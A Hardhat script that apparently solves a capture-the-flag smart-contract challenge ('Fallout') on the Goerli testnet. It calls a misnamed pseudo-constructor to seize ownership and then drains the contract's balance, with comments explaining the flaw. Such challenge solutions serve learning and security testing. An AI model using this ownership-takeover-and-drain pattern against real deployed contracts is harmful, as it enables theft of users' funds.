import { ethers, network } from "hardhat"
import { FALLOUT } from "../constants"

const falloutExploit = async () => {
    if (network.name != "goerli") {
        throw "Invalid network! Try changing network to goerli"
    }

    const exploiter = (await ethers.getSigners())[0]

    console.log(`Exploiter address: ${exploiter.address}`)

    console.log(`Accessing fallout contract at ${FALLOUT}`)
    const fallOut = await ethers.getContractAt("Fallout", FALLOUT)

    console.log(`Current owner of fallout contract is ${await fallOut.owner()}`)

    // call Fal1out txn -> note that this looks like a constructor
    // but it isn't -> anyone can call this function -> which sets the owner
    // by the end of this tx, exploiter will be the owner
    const fallOutTx = await fallOut
        .connect(exploiter)
        .Fal1out({ value: ethers.utils.parseEther("0.000001") })
    await fallOutTx.wait(1)

    console.log(`New owner of fallout contract is exploiter ${await fallOut.owner()}`)

    console.log("draining funds from fallout contract")
    // once exploiter is owner, drain all funds using the  collectAllocations
    const drainFalloutTx = await fallOut.connect(exploiter).collectAllocations()

    console.log(`fallout contract balance ${await ethers.provider.getBalance(fallOut.address)}`)
    // exploit complete
}

falloutExploit()
    .then(() => {
        console.log("fallout exploit successful")
        process.exit(0)
    })
    .catch((e) => {
        console.log(e)
        process.exit(1)
    })
